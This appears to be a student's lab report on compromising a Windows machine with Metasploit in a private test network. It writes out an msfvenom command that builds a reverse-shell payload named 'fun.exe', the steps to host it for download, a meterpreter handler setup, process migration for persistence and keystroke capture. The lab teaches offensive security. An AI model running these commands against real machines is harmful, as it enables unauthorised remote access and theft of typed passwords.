```
NAME : PRADEEP V
DEPT : AIML
REG NO : 212223240119

# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## Find the attackers ip address using ifconfig
## OUTPUT :
![01](https://github.com/user-attachments/assets/6d4b7dc2-9950-4ee1-ad5b-7a247b00e1c9)
## Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![02](https://github.com/user-attachments/assets/427d9c0f-9413-49e7-8de7-8e52b860d6a0)

copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start

## Check the status of apache2

## OUTPUT:
![03](https://github.com/user-attachments/assets/a863c28e-5826-4da0-b262-25763c1fa189)

## Invoke msfconsole:

## OUTPUT:
![04](https://github.com/user-attachments/assets/5745e5f4-8a7d-4930-92b8-a6bc1082df87)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![05](https://github.com/user-attachments/assets/18c05983-d6fe-419a-8c1d-48cf8298d835)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## OUTPUT:
![RECENT](https://github.com/user-attachments/assets/e2d42aa5-d92c-4af3-9f69-f5fb44a87807)
## WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads
## BROWSE OUTPUT :
![G1](https://github.com/user-attachments/assets/6364fe83-6790-46bd-80fa-f583d0754b1c)

## DOWNLOAD OUTPUT :
![G2](https://github.com/user-attachments/assets/f4021c4a-bed5-4a39-93bf-f7151bd12334)

## COME BACK TO PARROT :
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

## OUTPUT :

![og 06](https://github.com/user-attachments/assets/ffeb84a3-9d3f-4eff-b53b-9853175bdb51)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

## OUTPUT:

![07](https://github.com/user-attachments/assets/6dc41c79-35b6-4597-a55c-8e5c91802eb4)

## WINDOWS OUTPUT :
![G3](https://github.com/user-attachments/assets/36c6ad28-4fd4-47ec-92f9-151092072255)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![09](https://github.com/user-attachments/assets/ba95e33d-16be-4438-8e06-68ccd4873148)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
